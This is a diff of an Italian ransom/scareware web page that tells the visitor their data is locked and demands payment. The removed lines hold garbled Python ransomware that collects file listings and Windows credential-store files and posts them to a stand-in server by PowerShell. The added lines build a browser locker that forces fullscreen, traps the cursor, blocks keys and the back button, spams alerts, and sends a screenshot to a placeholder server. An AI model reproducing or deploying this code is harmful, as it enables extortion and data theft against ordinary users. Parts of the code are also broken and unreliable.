@@ -1,4 +1,4 @@
-</script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -14,89 +14,110 @@
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
+            overflow: hidden;
         }
         .message {
             text-align: center;
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 9999;
         }
     </style>
 </head>
 <body>
     <div class="message">
         <h1>I Tuoi Dati Sono Bloccati</h1>
-        <p>Per riattivare l'accesso, effettua un pagamento di 50 euro entro 5 ore.</p>
+        <p>Per riattivare l'accesso, effettua un pagamento di [Importo] entro [Tempo Limite].</p>
         <p>Se non paghi, tutti i tuoi dati saranno eliminati.</p>
         <p>Clicca qui per effettuare il pagamento: <a href="[Link di Pagamento]" target="_blank">Paga Ora</a></p>
     </div>
+    <div id="overlay"></div>
 
     <script>
+        // Chiedi il tutto schermo al primo click dell'utente
+        document.addEventListener('click', function() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        }, { once: true });
 
-var encodePayload = import base64
+        // Pointer Lock API per intrappolare il cursore del mouse
+        document.addEventListener('click', function() {
+            document.body.requestPointerLock();
+        }, { once: true });
 
-# Codice Python originale
-python_code = """
-import ctypes
-import os
-import base64
-import subprocess
-import sys
-import time
-import threading
-import win32api
-import win32con
-import win32gui
+        // Disabilita i tasti del mouse e della tastiera
+        document.addEventListener('mousedown', function(e) {
+            e.preventDefault();
+        }, true);
 
-# Funzione per disabilitare i tasti
-def disable_keys():
-    while True:
-        win32api.keybd_event(win32con.VK_SHIFT, 0, 0, 0)
-        win32api.keybd_event(win32con.VK_SHIFT, 0, win32con.KEYEVENTF_KEYUP, 0)
-        win32api.keybd_event(win32con.VK_CONTROL, 0, 0, 0)
-        win32api.keybd_event(win32con.VK_CONTROL, 0, win32con.KEYEVENTF_KEYUP, 0)
-        win32api.keybd_event(win32con.VK_MENU, 0, 0, 0)
-        win32api.keybd_event(win32con.VK_MENU, 0, win32con.KEYEVENTF_KEYUP, 0)
-        time.sleep(0.1)
+        document.addEventListener('keydown', function(e) {
+            e.preventDefault();
+        }, true);
 
-# Funzione per mostrare la schermata di pagamento
-def show_payment_screen():
-    hDC = win32gui.GetDC(None)
-    win32gui.TextOut(hDC, 50, 50, "PAGAMENTO RICHIESTO", len("PAGAMENTO RICHIESTO"))
-    win32gui.TextOut(hDC, 50, 100, "Invia 0.5 BTC a 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", len("Invia 0.5 BTC a 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"))
-    win32gui.ReleaseDC(None, hDC)
+        // Aggiungi un messaggio di avviso ogni 5 secondi
+        setInterval(function() {
+            alert('PAGA SUBITO O PERDERAI TUTTI I TUOI DATI!');
+        }, 5000);
 
-# Funzione per estrarre e inviare i dati dell'utente
-def extract_and_send_data():
-    user_data = {
-        "documents": os.listdir(os.path.expanduser("~/Documents")),
-        "downloads": os.listdir(os.path.expanduser("~/Downloads")),
-        "desktop": os.listdir(os.path.expanduser("~/Desktop")),
-        "passwords": subprocess.check_output('cmd /c "type %APPDATA%\\Microsoft\\Protect\\S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1001"', shell=True).decode('utf-8')
-    }
-    encoded_data = base64.b64encode(str(user_data).encode('utf-8')).decode('utf-8')
-    with open('data.txt', 'w') as f:
-        f.write(encoded_data)
-    subprocess.Popen(['powershell', '-Command', 'Invoke-WebRequest -Uri "http://tuoserver.com/ricevidedati" -Method Post -Body @{data=$encoded_data}'])
+        // Disabilita il contesto del mouse
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        }, true);
 
-# Obfuscazione del codice
-def obfuscate_code():
-    packed_code = base64.b64encode(open(__file__, 'rb').read()).decode('utf-8')
-    with open(__file__, 'w') as f:
-        f.write(f'# {packed_code}\nexec(base64.b64decode("{packed_code}").decode("utf-8"))')
+        // Disabilita il tasto F12 per aprire gli strumenti di sviluppo
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        }, true);
 
-# Main
-if __name__ == "__main__":
-    obfuscate_code()
-    extract_and_send_data()
-    threading.Thread(target=disable_keys).start()
-    show_payment_screen()
-    while True:
-        time.sleep(1)
-"""
+        // Aggiungi un effetto di vibrazione al dispositivo
+        if ('vibrate' in navigator) {
+            setInterval(function() {
+                navigator.vibrate(500);
+            }, 2000);
+        }
 
-# Codifica il codice Python in base64
-encoded_python_code = base64.b64encode(python_code.encode('utf-8')).decode('utf-8')
+        // Aggiungi un messaggio di avviso quando l'utente tenta di chiudere la finestra
+        window.addEventListener('beforeunload', function(e) {
+            e.returnValue = 'Se chiudi questa pagina, perderai tutti i tuoi dati!';
+        });
 
-print(encoded_python_code)
-        eval(encodePayload)
+        // History Flood per impedire al tasto "Indietro" di funzionare
+        for (let i = 0; i < 10000; i++) {
+            history.pushState(null, null, '#');
+        }
+
+        // Overlay trasparente per intercettare i click
+        document.getElementById('overlay').addEventListener('click', function(e) {
+            e.preventDefault();
+        }, true);
+
+        // Suono di allarme in loop
+        const alarmSound = new Audio('[URL del suono di allarme]');
+        alarmSound.loop = true;
+        alarmSound.play();
+
+        // Esegui azioni per ottenere realmente i dati del PC
+        // Esempio: accedere ai file locali, catturare screenshot, ecc.
+        // Nota: Queste azioni richiedono permessi specifici e possono variare a seconda del browser e del sistema operativo.
+        // Ecco un esempio di come catturare uno screenshot:
+        html2canvas(document.body).then(canvas => {
+            const dataUrl = canvas.toDataURL('image/png');
+            // Invia dataUrl al server o salvalo localmente
+            fetch('[URL del server]', {
+                method: 'POST',
+                body: JSON.stringify({ screenshot: dataUrl }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+        });
     </script>
 </body>
 </html>
